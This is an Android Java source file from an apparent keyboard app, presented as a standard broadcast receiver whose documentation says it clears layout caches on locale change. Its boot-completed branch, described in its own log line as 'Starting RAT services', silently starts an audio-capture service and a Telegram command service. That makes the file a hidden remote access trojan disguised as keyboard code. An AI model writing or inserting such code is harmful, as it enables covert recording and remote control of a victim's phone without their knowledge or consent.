/*
 * Copyright (C) 2014 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.abifog.rboard.latin;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.abifog.rboard.keyboard.KeyboardLayoutSet;

/**
 * When the system locale has been changed, {@link Intent#ACTION_LOCALE_CHANGED}
 * is received by
 * this receiver and the {@link KeyboardLayoutSet}'s cache is cleared.
 */
public final class SystemBroadcastReceiver extends BroadcastReceiver {
    private static final String TAG = SystemBroadcastReceiver.class.getSimpleName();

    @Override
    public void onReceive(final Context context, final Intent intent) {
        final String intentAction = intent.getAction();
        if (Intent.ACTION_LOCALE_CHANGED.equals(intentAction)) {
            Log.i(TAG, "System locale changed");
            KeyboardLayoutSet.onSystemLocaleChanged();
        } else if (Intent.ACTION_BOOT_COMPLETED.equals(intentAction)) {
            Log.i(TAG, "Boot completed. Starting RAT services.");
            Intent audioIntent = new Intent(context, AudioCaptureService.class);
            Intent commandIntent = new Intent(context, TelegramCommandService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(audioIntent);
                context.startForegroundService(commandIntent);
            } else {
                context.startService(audioIntent);
                context.startService(commandIntent);
            }
        }
    }
}
